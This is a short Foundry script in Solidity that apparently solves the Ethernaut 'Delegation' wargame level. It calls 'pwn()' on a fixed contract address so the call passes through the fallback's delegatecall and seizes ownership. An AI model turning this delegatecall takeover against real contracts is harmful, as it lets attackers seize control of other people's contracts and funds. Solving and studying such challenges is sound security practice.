// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";  
import "Ethernaut/delegation.sol";

contract DelegationPOCScript is Script {
    function run() public {
        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);
        Delegation delegation = Delegation(0x85DecBdA4B741177b31d440a62047b8A26eF3561);
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Exploit failed");
        vm.stopBroadcast();
    }
} 